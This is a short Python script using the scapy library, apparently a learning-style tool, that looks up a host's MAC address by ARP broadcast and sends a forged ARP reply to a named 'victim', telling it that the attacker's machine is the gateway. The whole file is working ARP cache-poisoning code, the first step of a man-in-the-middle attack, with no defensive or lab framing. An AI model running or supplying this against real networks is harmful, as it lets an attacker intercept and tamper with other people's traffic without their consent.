import scapy.all as scapy

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(victim_ip, gateway_ip):
    target_mac = get_mac(victim_ip)
    packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=target_mac, psrc=gateway_ip)
    scapy.send(packet)